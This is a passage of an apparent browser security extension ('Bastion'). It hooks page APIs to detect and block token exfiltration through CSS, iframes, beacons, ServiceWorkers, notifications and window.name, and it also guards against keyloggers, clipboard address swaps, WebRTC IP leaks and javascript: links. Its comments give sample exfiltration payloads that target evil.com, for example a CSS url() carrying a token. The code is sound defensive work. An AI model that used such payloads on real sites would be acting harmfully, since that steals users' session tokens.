      set(val) {
        if (scanHtmlForTokens(val)) return;
        origOuterHTMLSet.call(this, val);
      }
    });
  }

  // Patch insertAdjacentHTML
  const origInsertAdjacentHTML = Element.prototype.insertAdjacentHTML;
  Element.prototype.insertAdjacentHTML = function (pos, html) {
    if (scanHtmlForTokens(html)) return;
    return origInsertAdjacentHTML.apply(this, arguments);
  };

  // Patch document.write / writeln
  const origDocWrite = document.write;
  const origDocWriteln = document.writeln;
  document.write = function () {
    for (const arg of arguments) { if (scanHtmlForTokens(arg)) return; }
    return origDocWrite.apply(this, arguments);
  };
  document.writeln = function () {
    for (const arg of arguments) { if (scanHtmlForTokens(arg)) return; }
    return origDocWriteln.apply(this, arguments);
  };

  // =============================================
  // 5d2. ANTI-EXFIL: CSS-based exfiltration (style elements, insertRule)
  // =============================================
  // Attackers can use CSS url() to exfiltrate data: background: url("https://evil.com?t=TOKEN")

  function scanCssForTokens(css) {
    if (!css || typeof css !== 'string') return false;
    if (!css.includes('url(')) return false;
    const urlMatch = /url\s*\(\s*["']?([^"')]+)["']?\s*\)/gi;
    let match;
    while ((match = urlMatch.exec(css)) !== null) {
      const url = match[1];
      try {
        if (isCrossOrigin(url) && containsStoredToken(url)) {
          return alertExfil('css', url, 'url');
        }
      } catch {}
    }
    return false;
  }

  // Patch <style> element — use specific HTMLStyleElement approach instead of wrapping ALL textContent
  // We use MutationObserver on <style> elements to catch CSS token exfil
  const _styleObserver = new MutationObserver((mutations) => {
    for (const m of mutations) {
      if (m.target instanceof HTMLStyleElement || (m.target.parentElement && m.target.parentElement instanceof HTMLStyleElement)) {
        const style = m.target instanceof HTMLStyleElement ? m.target : m.target.parentElement;
        const css = style.textContent;
        if (scanCssForTokens(css) && settings.blockExfil) {
          style.textContent = '/* [Bastion] blocked */';
        }
      }
    }
  });
  // Observe permanently but throttle: disconnect/reconnect every 5s to avoid CPU waste on SPA re-renders
  let _styleObserverActive = true;
  if (document.documentElement) {
    _styleObserver.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
    // Throttle: pause 4s, observe 1s — still catches injections, saves CPU
    setInterval(() => {
      if (_styleObserverActive) {
        _styleObserver.disconnect();
        _styleObserverActive = false;
      } else {
        _styleObserver.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
        _styleObserverActive = true;
      }
    }, 3000);
  }

  // Patch CSSStyleSheet.insertRule
  if (window.CSSStyleSheet) {
    const origInsertRule = CSSStyleSheet.prototype.insertRule;
    CSSStyleSheet.prototype.insertRule = function (rule, index) {
      if (scanCssForTokens(rule)) return 0;
      return origInsertRule.apply(this, arguments);
    };
  }

  // =============================================
  // 5d3. ANTI-EXFIL: iframe srcdoc + same-origin iframe API patching
  // =============================================
  // Patch srcdoc setter — iframe srcdoc creates a same-origin context with clean APIs
  const srcdocDesc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'srcdoc');
  if (srcdocDesc && srcdocDesc.set) {
    const origSrcdocSet = srcdocDesc.set;
    Object.defineProperty(HTMLIFrameElement.prototype, 'srcdoc', {
      ...srcdocDesc,
      set(val) {
        if (typeof val === 'string' && /(?:localStorage|sessionStorage|document\.cookie|parent\.|top\.)/i.test(val)) {
          notify('TG_EXFIL_ALERT', {
            type: 'TG_EXFIL_ALERT', method: 'iframe.srcdoc', url: location.href,
            where: 'srcdoc', timestamp: Date.now(), blocked: settings.blockExfil
          });
          if (settings.blockExfil) return;
        }
        origSrcdocSet.call(this, val);
      }
    });
  }

  // Patch iframes added to DOM via MutationObserver — catches ALL iframes regardless of creation method
  // Each same-origin iframe realm gets its own clean copies of the APIs patched
  // above; patch every realm once (re-patching would stack wrappers). Keyed by
  // the realm's Object: a navigation from the initial about:blank may reuse the
  // Window but always resets the realm otherwise.
  const _patchedRealms = new WeakSet();
  function patchIframeApis(iframe) {
    try {
      if (!iframe.contentDocument) return; // cross-origin
      const win = iframe.contentWindow;
      if (!win || _patchedRealms.has(win.Object)) return;
      _patchedRealms.add(win.Object);

      try { patchCanvasApis(iframe.contentWindow); } catch {}

      if (!iframe.contentWindow.fetch) return;
      // Patch fetch
      const iframeFetch = iframe.contentWindow.fetch;
      iframe.contentWindow.fetch = function (input, init) {
        try {
          const url = typeof input === 'string' ? input : input instanceof Request ? input.url : String(input);
          if (isCrossOrigin(url)) {
            if (containsStoredToken(url)) {
              const block = alertExfil('iframe.fetch', url, 'url');
              if (block) return Promise.reject(new Error('[Bastion] Blocked'));
            }
            const body = (init && init.body) || (input instanceof Request ? input.body : null);
            if (body) {
              const bodyStr = bodyToString(body);
              if (bodyStr && containsStoredToken(bodyStr)) {
                const block = alertExfil('iframe.fetch', url, 'body');
                if (block) return Promise.reject(new Error('[Bastion] Blocked'));
              }
            }
          }
        } catch {}
        return iframeFetch.apply(this, arguments);
      };
      // Patch XHR
      if (iframe.contentWindow.XMLHttpRequest) {
        const iframeOpen = iframe.contentWindow.XMLHttpRequest.prototype.open;
        const iframeSend = iframe.contentWindow.XMLHttpRequest.prototype.send;
        iframe.contentWindow.XMLHttpRequest.prototype.open = function (m, url) {
          this._tgUrl = String(url); this._tgCross = isCrossOrigin(this._tgUrl);
          return iframeOpen.apply(this, arguments);
        };
        iframe.contentWindow.XMLHttpRequest.prototype.send = function (body) {
          try {
            if (this._tgCross) {
              if (containsStoredToken(this._tgUrl)) {
                const block = alertExfil('iframe.xhr', this._tgUrl, 'url');
                if (block) throw new Error('[Bastion] Blocked');
              }
              const xhrBody = bodyToString(body);
              if (xhrBody && containsStoredToken(xhrBody)) {
                const block = alertExfil('iframe.xhr', this._tgUrl, 'body');
                if (block) throw new Error('[Bastion] Blocked');
              }
            }
          } catch (e) { if (e.message.startsWith('[Bastion]')) throw e; }
          return iframeSend.apply(this, arguments);
        };
      }
      // Patch sendBeacon
      if (iframe.contentWindow.navigator && iframe.contentWindow.navigator.sendBeacon) {
        const iframeBeacon = iframe.contentWindow.navigator.sendBeacon;
        iframe.contentWindow.navigator.sendBeacon = function (url, data) {
          try {
            if (isCrossOrigin(url)) {
              const dataStr = bodyToString(data);
              if (containsStoredToken(String(url)) || containsStoredToken(dataStr)) {
                const block = alertExfil('iframe.sendBeacon', url, 'url');
                if (block) return false;
              }
            }
          } catch {}
          return iframeBeacon.apply(iframe.contentWindow.navigator, arguments);
        };
      }
    } catch {} // cross-origin iframe will throw
  }

  // Watch for any iframe added to DOM and patch its APIs
  const _iframePatchObserver = new MutationObserver((mutations) => {
    for (const m of mutations) {
      for (const node of m.addedNodes) {
        if (node.nodeName === 'IFRAME') {
          patchIframeApis(node);
          node.addEventListener('load', () => patchIframeApis(node));
        }
        if (node.firstElementChild) {
          for (const iframe of node.getElementsByTagName('iframe')) {
            patchIframeApis(iframe);
            iframe.addEventListener('load', () => patchIframeApis(iframe));
          }
        }
      }
    }
  });
  _iframePatchObserver.observe(document.documentElement, { childList: true, subtree: true });
  // Patch already-existing iframes
  function patchExistingIframes() {
    try {
      for (const iframe of document.querySelectorAll('iframe')) {
        patchIframeApis(iframe);
      }
    } catch {}
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', patchExistingIframes);
  } else {
    patchExistingIframes();
  }
  setTimeout(patchExistingIframes, 500);
  setTimeout(patchExistingIframes, 2000);

  // =============================================
  // 5e. ANTI-EXFIL: EventSource (SSE) & <a ping>
  // =============================================
  wrapConstructor('EventSource', (target, args, newTarget) => {
    const url = String(args[0]);
    if (isCrossOrigin(url) && containsStoredToken(url) && alertExfil('eventsource', url, 'url')) {
      throw new Error('[Bastion] Blocked');
    }
    return Reflect.construct(target, args, newTarget);
  });

  // Patch <a>.ping setter
  const pingDesc = Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype, 'ping');
  if (pingDesc && pingDesc.set) {
    const origPingSet = pingDesc.set;
    Object.defineProperty(HTMLAnchorElement.prototype, 'ping', {
      ...pingDesc,
      set(val) {
        try {
          const urls = String(val).split(/\s+/);
          for (const url of urls) {
            if (isCrossOrigin(url) && containsStoredToken(url)) {
              const block = alertExfil('a.ping', url, 'url');
              if (block) return;
            }
          }
        } catch {}
        origPingSet.call(this, val);
      }
    });
  }

  // (Section 5f removed — iframe API patching now handled by MutationObserver in section 5d3)

  // =============================================
  // 5f2. ANTI-EXFIL: window.location redirect with tokens
  // =============================================
  // Note: location.assign, location.replace, location.href are all read-only
  // properties on [object Location] and CANNOT be overridden in modern Chrome.
  // Navigation-based exfiltration (window.location = url) is unforgeable per spec.
  // We accept this limitation — other channels (fetch, XHR, etc.) are covered.

  // =============================================
  // 5g. ANTI-EXFIL: ServiceWorker registration monitoring
  // =============================================
  // A malicious SW can intercept ALL requests and exfiltrate tokens
  if (navigator.serviceWorker) {
    const origSWRegister = navigator.serviceWorker.register;
    navigator.serviceWorker.register = function (scriptURL, options) {
      try {
        const url = String(scriptURL);
        if (isCrossOrigin(url)) {
          notify('TG_EXFIL_ALERT', {
            type: 'TG_EXFIL_ALERT', method: 'serviceWorker.register', url: url.substring(0, 200),
            where: 'url', timestamp: Date.now(), blocked: true
          });
          return Promise.reject(new Error('[Bastion] Blocked cross-origin ServiceWorker'));
        }
      } catch {}
      return origSWRegister.apply(this, arguments);
    };
  }

  // =============================================
  // 5i. ANTI-EXFIL: DOMParser + adoptNode bypass (check src on DOM insertion)
  // =============================================
  // Elements created via DOMParser have src already set, bypassing setter patches.
  // We catch them when they're inserted into the live DOM.
  // Lightweight DOM insertion check — only runs when tokens exist in storage
  function checkNodeForTokenUrls(node) {
    // Fast exit: skip if no tokens stored (99% of the time on most sites)
    if (getStoredTokens().size === 0) return;
    if (!node || !node.getAttribute) return;
    const src = node.getAttribute('src');
    const href = node.getAttribute('href');
    for (const url of [src, href]) {
      if (url && isCrossOrigin(url) && containsStoredToken(url)) {
        const block = alertExfil('dom_insert', url, 'url');
        if (block) {
          node.removeAttribute(url === src ? 'src' : 'href');
        }
      }
    }
    // Only check children if the node is a container element (not a leaf)
    if (node.children && node.children.length > 0) {
      for (const child of node.querySelectorAll('[src],[href]')) {
        const cs = child.getAttribute('src');
        const ch = child.getAttribute('href');
        for (const url of [cs, ch]) {
          if (url && isCrossOrigin(url) && containsStoredToken(url)) {
            const block = alertExfil('dom_insert', url, 'url');
            if (block) child.removeAttribute(url === cs ? 'src' : 'href');
          }
        }
      }
    }
  }

  // An iframe inserted and used in the same task (before the MutationObserver
  // fires) would expose unpatched APIs, so patch it right after insertion.
  function patchInsertedIframes(node) {
    try {
      if (node.nodeName === 'IFRAME') patchIframeApis(node);
      else if (node.firstElementChild) for (const f of node.getElementsByTagName('iframe')) patchIframeApis(f);
    } catch {}
  }

  const origAppendChild = Node.prototype.appendChild;
  Node.prototype.appendChild = function (child) {
    checkNodeForTokenUrls(child);
    const result = origAppendChild.call(this, child);
    if (child && child.isConnected) patchInsertedIframes(child);
    return result;
  };

  const origInsertBefore = Node.prototype.insertBefore;
  Node.prototype.insertBefore = function (child, ref) {
    checkNodeForTokenUrls(child);
    const result = origInsertBefore.call(this, child, ref);
    if (child && child.isConnected) patchInsertedIframes(child);
    return result;
  };

  // =============================================
  // 5k. ANTI-EXFIL: Notification icon exfiltration
  // =============================================
  wrapConstructor('Notification', (target, args, newTarget) => {
    let [title, options] = args;
    for (const key of ['icon', 'image']) {
      if (!options || !options[key]) continue;
      try {
        const url = String(options[key]);
        if (isCrossOrigin(url) && containsStoredToken(url) && alertExfil('notification.' + key, url, 'url')) {
          options = { ...options, [key]: undefined };
        }
      } catch {}
    }
    return Reflect.construct(target, [title, options, ...args.slice(2)], newTarget);
  });

  // =============================================
  // 6. ANTI-WEBRTC — Prevent IP leaks via STUN
  // =============================================
  if (window.RTCPeerConnection) {
    // Works on a copy: pages often pass frozen config objects (Redux, immer).
    function sanitizeRTCConfig(config) {
      const servers = (config && config.iceServers) || [];
      const kept = servers.filter((server) => {
        const urls = Array.isArray(server.urls) ? server.urls : [server.urls || server.url || ''];
        const hasOnlyStun = urls.every((u) => typeof u === 'string' && u.startsWith('stun:'));
        if (hasOnlyStun) notify('TG_WEBRTC_BLOCK', { type: 'TG_WEBRTC_BLOCK', urls, timestamp: Date.now() });
        return !hasOnlyStun;
      });
      return { ...(config || {}), iceServers: kept };
    }

    // Filter host/srflx ICE candidates from SDP to prevent real IP leak
    function filterSDP(sdp) {
      if (!sdp) return sdp;
      return sdp.replace(/a=candidate:.*typ (host|srflx).*\r?\n/g, '');
    }

    const OrigRTC = wrapConstructor('RTCPeerConnection', (target, args, newTarget) => {
      if (settings.antiWebRTC) args = [sanitizeRTCConfig(args[0]), ...args.slice(1)];
      return Reflect.construct(target, args, newTarget);
    });
    // Chrome still exposes the prefixed alias of the same constructor
    if (window.webkitRTCPeerConnection === OrigRTC) window.webkitRTCPeerConnection = window.RTCPeerConnection;

    const origSetLocal = RTCPeerConnection.prototype.setLocalDescription;
    RTCPeerConnection.prototype.setLocalDescription = function (desc) {
      if (settings.antiWebRTC && desc && desc.sdp) {
        return origSetLocal.call(this, { type: desc.type, sdp: filterSDP(desc.sdp) }, ...Array.prototype.slice.call(arguments, 1));
      }
      return origSetLocal.apply(this, arguments);
    };
  }

  // =============================================
  // 6. KEYLOGGER DETECTION — Monitor suspicious key event listeners
  // =============================================
  let _keyListenerCount = 0;
  let _inputListenerCount = 0;
  let _keyloggerReported = false;
  // Only raw keyboard events on document/window are suspicious at high counts
  const RAW_KEY_EVENTS = ['keydown', 'keyup', 'keypress'];
  // input events are tracked separately (React/Vue use them legitimately via delegation)
  const INPUT_EVENTS = ['input', 'beforeinput', 'textInput', 'compositionend'];

  // Track per-element key listeners — keyloggers attach to each input individually
  let _perElementKeyTargets = new WeakSet();
  let _perElementKeyCount = 0;

  const origAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function (type, listener, options) {
    if (settings.antiKeylogger) {
      const isGlobal = this === document || this === window || this === document.body;
      if (isGlobal) {
        if (RAW_KEY_EVENTS.includes(type)) _keyListenerCount++;
        if (INPUT_EVENTS.includes(type)) _inputListenerCount++;
      }
      // Track per-element key listeners on input/textarea (keylogger pattern)
      if (!isGlobal && RAW_KEY_EVENTS.includes(type) && this instanceof HTMLElement) {
        const tag = this.tagName;
        if (tag === 'INPUT' || tag === 'TEXTAREA') {
          if (!_perElementKeyTargets.has(this)) {
            _perElementKeyTargets.add(this);
            _perElementKeyCount++;
          }
        }
      }
      // Alert: EITHER many global listeners OR many per-element keydown on inputs
      const globalSuspicious = _keyListenerCount >= 10 && _inputListenerCount >= 5;
      const perElementSuspicious = _perElementKeyCount >= 6;
      if ((globalSuspicious || perElementSuspicious) && !_keyloggerReported) {
        _keyloggerReported = true;
        const reason = perElementSuspicious ? 'per-element' : 'global';
        notify('TG_KEYLOGGER_DETECT', {
          type: 'TG_KEYLOGGER_DETECT',
          keyCount: _keyListenerCount, inputCount: _inputListenerCount,
          perElementCount: _perElementKeyCount, reason, event: type, timestamp: Date.now()
        });
      }
      // Detection only: OTP fields and form libraries legitimately attach
      // key listeners to every input, so listeners are never dropped.
    }
    return origAddEventListener.apply(this, arguments);
  };

  // =============================================
  // 6b. ANTI-EXFIL: window.name data channel protection
  // =============================================
  // window.name persists across navigations — attacker sets it to token, navigates to evil.com
  // Values without a stored token go to the native setter, so window.name
  // still survives reloads for the sites that rely on it.
  const windowNameDesc = Object.getOwnPropertyDescriptor(window, 'name');
  if (windowNameDesc && windowNameDesc.get && windowNameDesc.set) {
    try {
      Object.defineProperty(window, 'name', {
        ...windowNameDesc,
        set(val) {
          const str = String(val);
          if (containsStoredToken(str)) {
            notify('TG_EXFIL_ALERT', {
              type: 'TG_EXFIL_ALERT', method: 'window.name', url: location.href,
              where: 'name', timestamp: Date.now(), blocked: settings.blockExfil
            });
            if (settings.blockExfil) return;
          }
          windowNameDesc.set.call(this, str);
        }
      });
    } catch {}
  }

  // =============================================
  // 7. CLIPBOARD GUARD — Protect against address swap
  // =============================================
  // Crypto address patterns
  const CRYPTO_PATTERNS = [
    { name: 'BTC', pattern: /^(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,62})$/ },
    { name: 'ETH', pattern: /^0x[0-9a-fA-F]{40}$/ },
    { name: 'TRX', pattern: /^T[1-9A-HJ-NP-Za-km-z]{33}$/ },
    { name: 'SOL', pattern: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/ },
    { name: 'LTC', pattern: /^(L[a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1[a-zA-HJ-NP-Z0-9]{25,62})$/ },
    { name: 'IBAN', pattern: /^[A-Z]{2}\d{2}[A-Z0-9]{10,30}$/ },
  ];

  function isCryptoAddress(text) {
    if (typeof text !== 'string' || text.length < 20 || text.length > 70) return null;
    const trimmed = text.trim();
    for (const c of CRYPTO_PATTERNS) {
      if (c.pattern.test(trimmed)) return c.name;
    }
    return null;
  }

  // A swap is a script replacing an address the *user* just copied (selection
  // + Ctrl/Cmd+C or the context menu) with a different one, before the user
  // has done anything else. Writes from the page's own "Copy" buttons are
  // never treated as the user's copy, so consecutive legitimate writes pass.
  const SWAP_WINDOW_MS = 2000;
  let _userCopy = null;  // address from the last user copy
  let _userCopyTime = 0;
  let _lastInputTime = 0; // last click/keypress after which a write is user-driven

  _addEventListener.call(document, 'copy', () => {
    try {
      const sel = String(window.getSelection() || '').trim();
      _userCopy = isCryptoAddress(sel) ? sel : null;
      _userCopyTime = performance.now();
    } catch {}
  }, true);
  for (const type of ['pointerdown', 'keydown']) {
    _addEventListener.call(window, type, () => { _lastInputTime = performance.now(); }, { capture: true, passive: true });
  }

  // Returns the user's address if `text` would swap it, else null.
  function swappedAddress(text) {
    if (!settings.clipboardGuard || !_userCopy || text === _userCopy) return null;
    const now = performance.now();
    if (now - _userCopyTime > SWAP_WINDOW_MS || _lastInputTime > _userCopyTime) return null;
    const cryptoType = isCryptoAddress(text);
    if (!cryptoType) return null;
    notify('TG_CLIPBOARD_SWAP', {
      type: 'TG_CLIPBOARD_SWAP',
      original: _userCopy.substring(0, 20) + '...',
      swapped: text.substring(0, 20) + '...',
      cryptoType, timestamp: Date.now(), blocked: true
    });
    return _userCopy;
  }

  if (window.Clipboard && Clipboard.prototype.writeText) {
    const origWriteText = Clipboard.prototype.writeText;
    Clipboard.prototype.writeText = function (text) {
      const str = String(text);
      return origWriteText.call(this, swappedAddress(str) || str);
    };
  }

  // Binary clipboard.write() with a text/plain ClipboardItem — same check
  if (window.Clipboard && Clipboard.prototype.write) {
    const origWrite = Clipboard.prototype.write;
    Clipboard.prototype.write = function (items) {
      if (!settings.clipboardGuard || !_userCopy || !items || !items.length) return origWrite.apply(this, arguments);
      const clipboard = this;
      const args = arguments;
      return (async () => {
        try {
          for (const item of items) {
            if (item instanceof ClipboardItem && item.types.includes('text/plain')) {
              const text = await (await item.getType('text/plain')).text();
              const original = swappedAddress(text);
              if (original) {
                const origItem = new ClipboardItem({ 'text/plain': new Blob([original], { type: 'text/plain' }) });
                return origWrite.call(clipboard, [origItem]);
              }
            }
          }
        } catch {}
        return origWrite.apply(clipboard, args);
      })();
    };
  }

  // The classic hijack: a 'copy' listener that overwrites the selection via
  // event.clipboardData.setData().
  if (window.DataTransfer) {
    const origSetData = DataTransfer.prototype.setData;
    DataTransfer.prototype.setData = function (format, data) {
      if (settings.clipboardGuard && /^text(\/plain)?$/i.test(String(format))) {
        try {
          const sel = String(window.getSelection() || '').trim();
          const str = String(data);
          if (sel !== str && isCryptoAddress(sel) && isCryptoAddress(str)) {
            _userCopy = sel;
            _userCopyTime = performance.now();
            const original = swappedAddress(str);
            if (original) return origSetData.call(this, format, original);
          }
        } catch {}
      }
      return origSetData.apply(this, arguments);
    };
  }

  // =============================================
  // 8. TAB-NAPPING PROTECTION — detect background navigation
  // =============================================
  // window.open is left alone: forcing noopener makes it return null, which
  // breaks OAuth, payment and 3-D Secure popups and print windows. Links with
  // target=_blank already get noopener from the browser.

  // Report page navigation while the tab is not focused (tab-napping attack)
  {
    let _tabFocused = document.hasFocus();
    _addEventListener.call(window, 'blur', () => { _tabFocused = false; });
    _addEventListener.call(window, 'focus', () => { _tabFocused = true; });

    // location.assign/replace are read-only in modern browsers,
    // so we use beforeunload to warn about background navigation
    _addEventListener.call(window, 'beforeunload', () => {
      if (!_tabFocused && settings.antiTabNapping) {
        notify('TG_TABNAP_BLOCK', {
          type: 'TG_TABNAP_BLOCK', blockedUrl: location.href, timestamp: Date.now()
        });
      }
    });
  }

  // =============================================
  // 9. BLOCK javascript: URLs — Prevent XSS via links (opt-in)
  // =============================================
  const anchorHrefDesc = Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype, 'href');
  if (anchorHrefDesc && anchorHrefDesc.set) {
    const origAnchorHrefSet = anchorHrefDesc.set;
    Object.defineProperty(HTMLAnchorElement.prototype, 'href', {
      ...anchorHrefDesc,
      set(val) {
        if (isBlockedJsUrl(val)) {
          notify('TG_JS_URL_BLOCK', { type: 'TG_JS_URL_BLOCK', url: String(val).substring(0, 100), timestamp: Date.now() });
          origAnchorHrefSet.call(this, '#');
          return;
        }
        origAnchorHrefSet.call(this, val);
      }
    });
  }

  // Click on an existing javascript: link: cancel only the navigation. The
  // site's own click handlers still run (no stopPropagation).
  _addEventListener.call(document, 'click', (e) => {
    if (!settings.blockJavascriptUrls || !(e.target instanceof Element)) return;
    const link = e.target.closest('a[href]');
    const href = link && link.getAttribute('href');
    if (href && isBlockedJsUrl(href)) {
      e.preventDefault();
      notify('TG_JS_URL_BLOCK', { type: 'TG_JS_URL_BLOCK', url: href.substring(0, 100), timestamp: Date.now() });
    }
  }, true);

  // =============================================
  // 10. BLOCK data: IFRAMES — Prevent phishing iframes
  // =============================================
  const iframeSrcDesc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
  if (iframeSrcDesc && iframeSrcDesc.set) {
    const origIframeSrcSet = iframeSrcDesc.set;
    Object.defineProperty(HTMLIFrameElement.prototype, 'src', {
      ...iframeSrcDesc,
      set(val) {
        if (isBlockedIframeSrc(val)) {
          reportBlockedIframe(val);
          return; // don't set src
        }
        origIframeSrcSet.call(this, val);
      }
    });
  }
})();
